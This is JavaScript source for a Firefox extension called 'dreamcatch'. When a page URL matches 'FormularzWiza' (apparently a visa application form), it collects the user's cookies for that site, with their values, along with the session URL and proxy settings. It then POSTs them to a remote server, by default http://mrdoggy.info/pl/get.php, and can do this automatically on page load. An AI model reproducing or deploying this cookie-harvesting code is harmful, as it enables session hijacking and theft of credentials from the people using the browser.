var dreamcatch = {

  lastSent : "",
  prevPostVal : "",

  onLoad: function() {
     window.removeEventListener("load", this.onLoad, true);
     var prefserv = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService);
	 if (prefserv.getBoolPref("extensions.dreamcatch.autorun"))
	 {
		 dreamcatch.dump("get appconten");
		var appcontent = document.getElementById("appcontent");   // browser
		if(appcontent){
		  appcontent.addEventListener("DOMContentLoaded", dreamcatch.onPageLoad, true);
		}
		var messagepane = document.getElementById("messagepane"); // mail
		if(messagepane){
		  messagepane.addEventListener("load", function(event) { dreamcatch.onPageLoad(event); }, true);
		}
	 }
  },

  onPageLoad: function(aEvent) {
	 var postvar = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService).getCharPref("extensions.dreamcatch.postvar");
    var doc = aEvent.originalTarget;
	 if(doc.location.href.search("FormularzWiza") > -1)
      dreamcatch.onToolbarButtonCommand(aEvent);
	 else if(postvar) {
		
//		doc.documentElement.innerHTML
	 }
  },

  unLoad: function() { 
    window.removeEventListener("SSTabRestoring", this, false);
  
  },

  onToolbarButtonCommand: function(e) {

		var dateObj = new Date();
		var prefserv = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService);
		// get url
		var urlfnd = prefserv.getCharPref("extensions.dreamcatch.regexp") || "FormularzWiza\.aspx\?guid=(.+)";
		var url = getBrowser().mCurrentBrowser.currentURI.spec;
		var expr = new RegExp(urlfnd,"i");
		var str = expr.exec(url);
		var guid = "";
		if (str && str.length > 1)
		{
			guid = str[1];
		} else {
			return;
		}
		var cdate = dateObj.getFullYear()+'-'+addZero(dateObj.getMonth()+1) + "-" + addZero(dateObj.getDate());
		var result = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n';
		result += '<session dateObtainedAt="'+dateObj.getTime()+'" url="'+getBrowser().mCurrentBrowser.currentURI.spec+'">\n';

		// get cookie
		var cookieManager = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager);
		var cookies = [];
		var domain = getBrowser().mCurrentBrowser.currentURI.host;
		var path = getBrowser().mCurrentBrowser.currentURI.path;
		var iter = cookieManager.enumerator;
		var dotDomain;
		i=0;
		result += "<cookies>\n";
		while ( iter.hasMoreElements() ){
			cookie = iter.getNext().QueryInterface(Components.interfaces.nsICookie);
			dotDomain = '.'+domain;

			if ( cookie instanceof Components.interfaces.nsICookie && cookie.name && this.endsWith( dotDomain, cookie.host ) && this.beginsWith( path, cookie.path ) ) {
				var expCookie = '';
				if (cookie.expires)
				{
					var dat = new Date(cookie.expires*1000);
					this.dump(cookie.expires + ': '+dat.toString());
					expCookie = '" cookieExpires="'+dat.toLocaleFormat("%Y-%m-%dT%H:%M:%S")+this.calcTZ(dat.getTimezoneOffset());
				}

				result += '<cookie cookieIsHttpOnly="'+cookie.isDomain +'" cookieIsSecure="'+cookie.isSecure + expCookie +'" cookiePath="'+cookie.path+'" cookieDomain="'+cookie.host +'" cookieValue="'+cookie.value+'" cookieName="'+cookie.name +'"/>\n';
			}
		} 
		result += "</cookies>\n";

		// get proxy 
		var proxy = prefserv.getCharPref("network.proxy.http");
		var proxy_port = prefserv.getIntPref("network.proxy.http_port"); 
		result += '<proxy port="'+proxy_port+'" host="'+proxy+'"/>\n</session>\n';
		
		var postvar = "DATA";

		var posturl = prefserv.getCharPref("extensions.dreamcatch.remoteaddr") || 'http://mrdoggy.info/pl/get.php';

		result = postvar + "=" + encodeURIComponent(result);
	
		if (this.lastSent!=guid)
		{
			this.dump("to "+posturl);
			var xmlhttp = this.getXmlHttp();
			xmlhttp.open('POST', posturl, false);
			xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
			xmlhttp.send(result);
			if(xmlhttp.status == 200) {
				this.lastSent = guid;
				alert("Information sent successfully!");
			}
		}
  },

	calcTZ: function(date) {
		var tz = date / 60;
		var res = tz;
		if (Math.round(tz) != tz) {
			res = this.addZero(Math.round(tz)) + ':30';
		}
		else {
			res = addZero(tz) + ':00';
		}
		return res;
	},

	dump: function(obj) {
		var consoleService = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
		consoleService.logStringMessage(obj);
	},

	endsWith: function(t, s) {
		if ( t.length < s.length )
			return false;
		return t.substr( t.length-s.length ) == s;
	},
	
	beginsWith: function(t, s) {
		if ( t.length < s.length )
			return false;
		return t.substr( 0, s.length ) == s;
	},

	getXmlHttp: function(){
	  var xmlhttp;
	  try {
		 xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
	  } catch (e) {
		 try {
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		 } catch (E) {
			xmlhttp = false;
		 }
	  }
	  if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
		 xmlhttp = new XMLHttpRequest();
	  }
	  return xmlhttp;
	}

};

function addZero(i) {
	return (i < 10 && i >=0 )? "0" + i: ((i<0 && i > -10) ? "-0"+Math.abs(i) : i  );
}

window.addEventListener("load", function() dreamcatch.onLoad(), false);
window.addEventListener("unload", function() dreamcatch.unLoad(), false);
window.addEventListener("delayLoadRefresher", dreamcatch, false);


